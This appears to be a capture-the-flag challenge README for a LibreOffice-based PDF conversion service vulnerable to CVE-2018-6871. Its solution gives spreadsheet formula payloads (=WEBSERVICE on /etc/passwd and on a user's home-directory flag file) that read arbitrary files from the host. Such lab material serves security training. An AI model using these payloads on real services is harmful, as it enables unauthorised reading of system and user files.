LibreOffice
========

**Challenge description: (internal)**
LibreOffice had [CVE-2018-6871](https://www.rapid7.com/db/vulnerabilities/alpine-linux-cve-2018-6871) which allowed attacker to access arbitrary file on the host.

**Challenge description: (external)**

We setup this PDF conversion service for public use, hopefully it is safe.

**Run with:**

```
docker build --tag=pdf . [--no-cache]
docker run -p 80:80 pdf
```

**Solution description:**

1. List users with `=WEBSERVICE("/etc/passwd")` (upload a spreadsheet with the cell with that payload)

2. Notice there is a user named `libreoffice_admin`

3. Read flag from his directory using `=WEBSERVICE("/home/libreoffice_admin/flag")`.
